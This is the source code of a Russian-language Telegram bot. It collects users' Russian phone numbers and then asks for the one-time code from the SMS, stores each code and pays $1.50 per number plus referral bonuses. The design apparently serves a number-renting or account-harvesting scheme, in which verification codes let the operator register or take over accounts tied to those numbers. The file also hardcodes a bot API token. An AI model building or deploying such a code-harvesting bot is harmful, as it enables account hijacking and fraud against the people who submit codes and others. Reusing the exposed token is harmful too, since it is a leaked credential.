import telebot
from telebot import types
import json
import os
import threading
import time

TOKEN = "8615502179:AAHnauhIjOZQXpmlhl7PdnT7migiJFBGbwE"
BOT_USERNAME = "tailerMax_bot"  # без @
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

DATA_FILE = "data.json"

# через сколько секунд бот попросит код из СМС
QUEUE_WAIT_SECONDS = 20

# временные состояния пользователей
user_states = {}


def load_data():
    if not os.path.exists(DATA_FILE):
        return {}
    with open(DATA_FILE, "r", encoding="utf-8") as f:
        return json.load(f)


def save_data(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)


def get_user(data, user_id):
    user_id = str(user_id)
    if user_id not in data:
        data[user_id] = {
            "numbers": 0,
            "balance": 0,
            "refs": 0,
            "invited_by": None,
            "requests": []
        }
    return data[user_id]


def main_menu():
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("📊 Статистика", callback_data="stats"),
        types.InlineKeyboardButton("➕ Добавить номер", callback_data="add")
    )
    markup.add(
        types.InlineKeyboardButton("👥 Рефералка", callback_data="ref")
    )
    return markup


def back_menu():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("⬅️ Назад", callback_data="back_main"))
    return markup


def send_welcome(chat_id, user_id, first_name):
    data = load_data()
    user = get_user(data, user_id)
    save_data(data)

    text = (
        f"👋 <b>Добро пожаловать, {first_name}!</b>\n\n"
        f"🆔 Ваш ID: <code>{user_id}</code>\n"
        f"👥 Рефералов: <b>{user['refs']}</b>\n"
        f"📱 Добавлено номеров: <b>{user['numbers']}</b>\n"
        f"💰 Баланс: <b>{user['balance']}$</b>\n\n"
        f"Выберите действие ниже:"
    )

    bot.send_message(chat_id, text, reply_markup=main_menu())


def get_queue_position(data):
    count = 0
    for _, user in data.items():
        for req in user.get("requests", []):
            if req.get("status") in ["waiting_queue", "waiting_sms"]:
                count += 1
    return count + 1


def schedule_sms_request(chat_id, user_id, number_text):
    def worker():
        time.sleep(QUEUE_WAIT_SECONDS)

        data = load_data()
        user = get_user(data, user_id)

        updated = False
        for req in user.get("requests", []):
            if req.get("number") == number_text and req.get("status") == "waiting_queue":
                req["status"] = "waiting_sms"
                updated = True
                break

        save_data(data)

        if updated:
            user_states[str(user_id)] = {
                "state": "waiting_sms_code",
                "number": number_text
            }

            bot.send_message(
                chat_id,
                (
                    f"✅ Ваша очередь подошла.\n\n"
                    f"📱 Номер: <code>{number_text}</code>\n"
                    f"📩 Здравствуйте, напишите свой код из СМС:"
                ),
                reply_markup=back_menu()
            )

    threading.Thread(target=worker, daemon=True).start()


@bot.message_handler(commands=["start"])
def start(message):
    data = load_data()
    user_id = str(message.from_user.id)
    user = get_user(data, user_id)

    args = message.text.split()

    if len(args) > 1:
        ref_id = str(args[1])
        if ref_id != user_id and user["invited_by"] is None:
            ref_user = get_user(data, ref_id)
            user["invited_by"] = ref_id
            ref_user["refs"] += 1
            ref_user["balance"] += 1
            save_data(data)

    send_welcome(message.chat.id, user_id, message.from_user.first_name or "пользователь")


@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    data = load_data()
    user_id = str(call.from_user.id)
    user = get_user(data, user_id)

    if call.data == "stats":
        text = (
            f"📊 <b>Ваша статистика</b>\n\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"👥 Рефералов: <b>{user['refs']}</b>\n"
            f"📱 Добавлено номеров: <b>{user['numbers']}</b>\n"
            f"💰 Баланс: <b>{user['balance']}$</b>\n"
            f"📝 Всего заявок: <b>{len(user.get('requests', []))}</b>"
        )

        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=main_menu()
        )

    elif call.data == "ref":
        text = (
            f"👥 <b>Ваша реферальная ссылка:</b>\n\n"
            f"https://t.me/{BOT_USERNAME}?start={user_id}\n\n"
            f"💸 За каждого приглашённого: <b>+1$</b>"
        )

        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=main_menu()
        )

    elif call.data == "add":
        user_states[user_id] = {"state": "waiting_number"}

        text = (
            f"➕ <b>Добавление номера</b>\n\n"
            f"Введите номер в формате:\n"
            f"<code>+7XXXXXXXXXX</code>"
        )

        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=back_menu()
        )

    elif call.data == "back_main":
        text = (
            f"👋 <b>Добро пожаловать!</b>\n\n"
            f"🆔 Ваш ID: <code>{user_id}</code>\n"
            f"👥 Рефералов: <b>{user['refs']}</b>\n"
            f"📱 Добавлено номеров: <b>{user['numbers']}</b>\n"
            f"💰 Баланс: <b>{user['balance']}$</b>\n\n"
            f"Выберите действие ниже:"
        )

        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=main_menu()
        )

    bot.answer_callback_query(call.id)


@bot.message_handler(content_types=["text"])
def text_handler(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id
    text = message.text.strip()

    state_data = user_states.get(user_id, {})
    state = state_data.get("state")

    if text.startswith("/start"):
        return

    # Шаг: ввод номера
    if state == "waiting_number":
        if not text.startswith("+7"):
            bot.send_message(
                chat_id,
                "❌ Номер должен начинаться с <code>+7</code>\nПример: <code>+79991234567</code>",
                reply_markup=back_menu()
            )
            return

        if len(text) != 12 or not text[1:].isdigit():
            bot.send_message(
                chat_id,
                "❌ Неверный формат номера.\nВведите так: <code>+79991234567</code>",
                reply_markup=back_menu()
            )
            return

        data = load_data()
        user = get_user(data, user_id)

        queue_position = get_queue_position(data)

        user.setdefault("requests", []).append({
            "number": text,
            "status": "waiting_queue",
            "sms_code": None,
            "created_at": int(time.time())
        })

        save_data(data)

        user_states[user_id] = {
            "state": "in_queue",
            "number": text
        }

        bot.send_message(
            chat_id,
            (
                f"✅ Номер <code>{text}</code> добавлен.\n\n"
                f"⏳ Вы в очереди: <b>{queue_position}</b>\n"
                f"🕒 Ожидайте, скоро бот запросит код из СМС."
            ),
            reply_markup=main_menu()
        )

        schedule_sms_request(chat_id, user_id, text)
        return

    # Шаг: ввод кода из СМС
    if state == "waiting_sms_code":
        if not text.isdigit():
            bot.send_message(
                chat_id,
                "❌ Код из СМС должен состоять только из цифр.\nПопробуйте ещё раз.",
                reply_markup=back_menu()
            )
            return

        data = load_data()
        user = get_user(data, user_id)
        number_text = state_data.get("number")

        updated = False
        for req in user.get("requests", []):
            if req.get("number") == number_text and req.get("status") == "waiting_sms":
                req["status"] = "done"
                req["sms_code"] = text
                updated = True
                break

        if updated:
            user["numbers"] += 1
            user["balance"] += 1.5
            save_data(data)

            user_states[user_id] = {"state": None}

            bot.send_message(
                chat_id,
                (
                    f"✅ Код <code>{text}</code> принят.\n\n"
                    f"📱 Номер успешно обработан.\n"
                    f"📊 Всего добавлено номеров: <b>{user['numbers']}</b>\n"
                    f"💰 Баланс: <b>{user['balance']}$</b>"
                ),
                reply_markup=main_menu()
            )
        else:
            bot.send_message(
                chat_id,
                "❌ Не удалось найти активную заявку для этого номера.",
                reply_markup=main_menu()
            )
        return

    # Если просто пишет текст без состояния
    bot.send_message(
        chat_id,
        "Выберите действие через кнопки ниже.",
        reply_markup=main_menu()
    )


print("Bot started")
bot.infinity_polling(skip_pending=True)
